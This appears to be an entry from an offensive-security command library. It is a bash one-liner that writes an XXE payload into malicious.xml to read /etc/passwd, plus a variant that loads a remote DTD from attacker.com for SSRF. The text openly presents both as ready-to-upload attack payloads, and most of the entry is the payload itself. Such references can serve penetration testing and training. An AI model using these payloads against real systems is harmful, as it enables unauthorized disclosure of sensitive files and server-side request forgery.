---
data: >-
  echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM
  "file:///etc/passwd">]><foo>&xxe;</foo>' > malicious.xml
tags:
  - xxe
  - payload
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 257b632d-911c-4e8b-a8ce-b2dea1a4eada
created_at: '2025-12-13T09:00:27.821Z'
updated_at: '2025-12-13T09:00:27.821Z'
verified: false
validated: true
submitted: true
---
# Craft XXE XML Payload

## Command

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' > malicious.xml
```

## Description

This command creates a malicious XML file with an external entity reference designed to exploit XXE vulnerabilities by attempting to read sensitive files like /etc/passwd. Use it to prepare payloads for upload-based attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `file:///etc/passwd` | URI of the target file to disclose | Yes |
| `> malicious.xml` | Output file name | Yes |

## Examples

### Basic Usage

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' > malicious.xml
```

### Advanced Usage

```bash
echo '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>' > ssrf.xml
```

## Expected Output

A file named malicious.xml is created with the XXE payload, ready for upload.

## Related

- [[procedures/Upload-and-Exploit-XXE]]
- [[commands/curl-upload-xxe-file]]
